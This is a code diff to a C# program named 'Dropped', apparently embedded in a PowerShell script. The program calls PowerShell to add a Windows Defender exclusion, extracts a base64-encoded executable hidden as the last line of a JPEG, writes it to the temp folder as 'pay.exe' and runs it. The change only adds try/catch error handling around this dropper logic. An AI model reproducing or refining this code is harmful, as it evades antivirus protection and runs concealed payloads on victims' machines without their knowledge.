@@ -82,19 +82,28 @@ public class Dropped
 {
     public static void Main()
     {
-        string path = Path.GetTempPath();
-        Process pstest = new Process();
-        pstest.StartInfo.FileName = "powershell.exe";
-        pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath path";
-        pstest.Start();
-        string path2 = Directory.GetCurrentDirectory();
-        string image = "REPLACE" + "\\test_image.jpg";
-        var last_line = File.ReadLines(image).Last().ToString();
-        var base64_decode = Convert.FromBase64String(last_line);
-        File.WriteAllBytes(path + "pay.exe", base64_decode);
-        Process ps = new Process();
-        ps.StartInfo.FileName = path + "pay.exe";
-        ps.Start();
+        try
+        {
+            string path = Path.GetTempPath();
+            Process pstest = new Process();
+            pstest.StartInfo.FileName = "powershell.exe";
+            pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath path";
+            pstest.Start();
+            string path2 = Directory.GetCurrentDirectory();
+            string image = "REPLACE" + "\\test_image.jpg";
+            var last_line = File.ReadLines(image).Last().ToString();
+            var base64_decode = Convert.FromBase64String(last_line);
+            File.WriteAllBytes(path + "pay.exe", base64_decode);
+            Process ps = new Process();
+            ps.StartInfo.FileName = path + "pay.exe";
+            ps.Start();
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine("An error occurred: " + ex.Message);
+            Console.WriteLine("Press any key to exit.");
+            Console.ReadKey();
+        }
     }
 }
 "@
